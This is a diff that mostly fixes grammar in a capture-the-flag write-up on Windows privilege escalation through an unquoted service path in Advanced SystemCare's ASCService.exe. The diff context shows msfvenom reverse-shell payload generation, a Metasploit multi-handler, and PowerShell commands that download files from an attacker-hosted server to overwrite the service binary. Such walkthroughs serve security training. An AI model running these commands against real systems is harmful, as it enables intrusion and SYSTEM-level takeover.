@@ -42,6 +42,7 @@ Next step is to list the options and set the required options as seen below.
 
 Options:
 ![](attachments/20230912201857.png)
+
 Options set
 
 ![](attachments/20230912201920.png)
@@ -80,6 +81,7 @@ powershell_shell
 ```
 
 ![](attachments/20230913095618.png)
+ 
  We can then navigate to where we uploaded the script and execute it:
 ```powershell
 cd path\to\script
@@ -92,11 +94,11 @@ This will then enumerate and print out results.
 
 **Question 5**: "Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an _unquoted service path_ vulnerability?"
 
-The result we are interested in it the one with the "CanRestart"  option set to True, which indicates that our current user has permissions to restart that service.
+The result we are interested in is the one with the "CanRestart"  option set to True, which indicates that our current user has permission to restart that service.
 
 ![](attachments/20230913100109.png)
 
-As we can see from the image above we have a modifiable path and write permissions to that directory. This means we can replace the ASCService.exe file there with our maliciously crafted payload, restart the service which will then run our infected program.
+As we can see from the image above we have a modifiable path and write permissions to that directory. This means we can replace the ASCService.exe file there with our maliciously crafted payload, and restart the service which will then run our infected program.
 
 Next we craft our payload from our attack machine using msfvenom and name it the same name as the AdvanceSystemCareService executable which is "ASCService.exe":
 ```shell
@@ -123,7 +125,7 @@ upload /path/to/payload
 
 ![](attachments/20230913101225.png)
 
-Before we execute our payload by starting the service again, we need to first setup a multi handler to catch our new shell as NT Authority\\System. To do that we first background our current meterpreter shell using CTRL + Z and use the multi handler:
+Before we execute our payload by starting the service again, we need to first setup a multi handler to catch our new shell as NT Authority\\System. To do that we first background our current meterpreter shell using CTRL + Z and use the multi-handler:
 
 ```shell
 use exploit/multi/handler
@@ -167,7 +169,7 @@ Now to find the flag. It'll most probably be in the Administrator's Desktop.
 # Access and Escalation without Metasploit
 Now let's complete the room without the use of Metasploit.
 
-For this we will utilise powershell and [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) to enumerate the system and collect the relevant information to escalate to
+For this, we will utilize powershell and [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) to enumerate the system and collect the relevant information to escalate to
 
 The aim here is to try and get access to the machine and perform privilege escalation without metasploit.
 
@@ -182,7 +184,9 @@ After getting the exploit let's necessary settings. First is the IP address of o
 ![](attachments/20230913135614.png)
 
 ![](attachments/20230913140136.png)
-Take note of the this statement. We will need to run a python server on port 80 in the same directory as our netcat [binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe) file. If you already have a service running on port 80 like i did in my case you can just stop the service using:
+
+
+Take note of this statement. We will need to run a python server on port 80 in the same directory as our netcat [binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe) file. If you already have a service running on port 80 like I did in my case you can just stop the service using:
 
 ```shell
 sudo systemctl stop <service_name>
@@ -190,12 +194,12 @@ sudo systemctl stop <service_name>
 
 ![](attachments/4f4ee69bfe895cf3acbc23913a5d199e_MD5.png)
 
-Next step is to start a python server in the directory as our netcat binary. When the exploit is ran it will need a server hosting the file in order to transfer it to the target machine. We will then run the exploit a second time to execute the file and gain a shell once our netcat listener is set to that the specified port which in my case was **4443** in order catch the shell.
+Next step is to start a python server in the directory as our netcat binary. When the exploit is run it will need a server hosting the file in order to transfer it to the target machine. We will then run the exploit a second time to execute the file and gain a shell once our netcat listener is set to the specified port which in my case was **4443** in order to catch the shell.
 
 ![](attachments/20230913141304.png)
-Next step is to transfer a winPEAS script to autotmate our Privilege Escalation Enumeration and then run the script.
+Next step is to transfer a winPEAS script to automate our Privilege Escalation Enumeration and then run the script.
 
-Command to transfer the script form our attack machine to our target machine:
+Command to transfer the script from our attack machine to our target machine:
 ```powershell
 powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<IP>:<PORT>/winPEASx64.exe', 'C:\\Windows\temp\winPEASx64.exe')"
 ```
@@ -206,14 +210,15 @@ Command to execute the script:
 
 ![](attachments/20230913141953.png)
 
-Now lets take a look at our winPEAS scan. We can see that there is an Unquoted service path  and that we have write access to 
+Now let's take a look at our winPEAS scan. We can see that there is an Unquoted service path  and that we have write access to 
 ```
 C:\Program Files (x86)\IObit\Advanced SystemCare\
 ```
-In that directory there is a service executable "ASCService.exe" that we can abuse by replacing this with a malicious file which will give us a reverse shell.
+In that directory, there is a service executable "ASCService.exe" that we can abuse by replacing this with a malicious file which will give us a reverse shell.
 
 ![](attachments/20230913142635.png)
- All we need to do is to create a windows reverse shell payload  using msfvenom and save it into a file with the same name as the service "ASSCService.exe". Then in order to upload and replace the legitimate file with our malicious payload file we need to first of all stop the **AdvancedSystemCareService9** service, then upload our payload into the same directory in order to overwrite the existing file.
+
+ All we need to do is to create a Windows reverse shell payload  using msfvenom and save it into a file with the same name as the service "ASSCService.exe". Then in order to upload and replace the legitimate file with our malicious payload file we need to first of all stop the **AdvancedSystemCareService9** service, then upload our payload into the same directory in order to overwrite the existing file.
 
 Let's first create our payload using msfvenom:
 ```shell
@@ -226,7 +231,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4443 -e x86/shikata_ga_nai 
 powershell -c "Stop-Service -Name 'AdvancedSystemCareService9' -Force"
 ```
 
-And now transfer our payload to overwrite the file:
+Now transfer our payload to overwrite the file:
 ```shell
 powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<IP>:<PORT>/ASCService.exe', 'C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe')"
 ```
